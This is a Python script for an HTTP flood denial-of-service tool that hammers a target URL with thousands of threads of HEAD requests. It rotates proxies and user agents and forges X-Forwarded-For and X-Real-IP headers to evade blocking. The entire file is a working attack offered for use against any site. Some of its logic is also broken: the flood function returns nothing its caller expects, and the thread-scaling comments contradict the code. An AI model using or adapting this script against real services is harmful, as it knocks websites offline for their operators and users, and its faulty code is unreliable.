import requests
import random
import threading
import time
import sys
import os
import httpx
import psutil

# Load files
def load_file(filename):
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

# Load user agents, referers, and proxies
user_agents = load_file('ua.txt') or ["Mozilla/5.0"]
referers = load_file('refs.txt') or ["https://google.com"]
proxies = load_file('proxy.txt') + load_file('proxies.txt')

# Random IP generator for headers
def random_ip():
    return '.'.join(str(random.randint(1, 255)) for _ in range(4))

# Generate random headers for requests
def generate_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "Referer": random.choice(referers),
        "X-Forwarded-For": random_ip(),
        "X-Real-IP": random_ip(),
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
    }

# Function to clear terminal screen
def clear_terminal():
    if sys.platform == 'win32':
        os.system('cls')
    else:
        os.system('clear')

# Function to determine the number of threads based on current CPU usage
def get_dynamic_threads():
    # Get the current CPU usage percentage
    cpu_usage = psutil.cpu_percent(interval=1)  # Wait for 1 second and get CPU usage
    
    # Set the number of threads based on CPU usage
    if cpu_usage < 50:
        threads = 1000  # Use fewer threads when CPU usage is low
    elif cpu_usage < 75:
        threads = random.randint(1500, 2000)  # Moderate threads based on CPU load
    else:
        threads = random.randint(2000, 2500)  # More threads when CPU usage is high
    
    return threads

# Send flood requests function
def send_flood(target):
    attempted, success, failed = 0, 0, 0
    peak_rps = 0
    start_time = time.time()

    def attack():
        nonlocal attempted, success, failed, peak_rps
        while True:
            headers = generate_headers()
            proxy = random.choice(proxies) if proxies else None
            try:
                if proxy:
                    proxies_format = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
                    res = requests.head(target, headers=headers, proxies=proxies_format, timeout=3)
                else:
                    with httpx.Client(http2=True, timeout=3) as client:
                        res = client.head(target, headers=headers)

                attempted += 1
                if res.status_code == 200:  # If request goes through successfully
                    success += 1
                else:  # If blocked request (non-2xx response)
                    failed += 1

            except requests.exceptions.RequestException:
                attempted += 1

            # Track peak RPS (requests per second)
            elapsed = round(time.time() - start_time, 2)
            rps = round(attempted / elapsed, 2)
            if rps > peak_rps:
                peak_rps = rps

    # Dynamically scale threads based on CPU usage
    num_threads = get_dynamic_threads()  # Get the number of threads based on CPU usage
    print(f"Scaling attack to {num_threads} threads.")
    
    # Create threads
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()  # Allow threads to run indefinitely

# Running the flood
def run_flood(target):
    total, success, failed, peak, elapsed = 0, 0, 0, 0, 0

    # Start attack
    clear_terminal()
    print("Starting attack...")
    print(f"Target: {target}")

    try:
        while True:
            attempted, success, failed, peak_rps, elapsed_time = send_flood(target)

            # Clear terminal periodically and print attack stats
            clear_terminal()
            print(f"TOTAL REQUESTS SENT: {attempted}")
            print(f"SUCCES: {success}")
            print(f"FAILED: {failed}")
            print(f"PEAK REQUESTS PER SECOND: {peak_rps}")
            print(f"TIME ELAPSED: {round(elapsed_time, 2)} seconds")

            # Periodically update status every few seconds
            time.sleep(2)
    except KeyboardInterrupt:
        # Handle manual stop via CTRL+C
        print("\nAttack stopped manually.")
        clear_terminal()
        print(f"TOTAL REQUESTS SENT: {attempted}")
        print(f"SUCCES: {success}")
        print(f"FAILED: {failed}")
        print(f"PEAK REQUESTS PER SECOND: {peak_rps}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 main.py <target_url>")
        sys.exit(1)

    target_url = sys.argv[1]

    # Run flood directly from VPS
    run_flood(target_url)
    
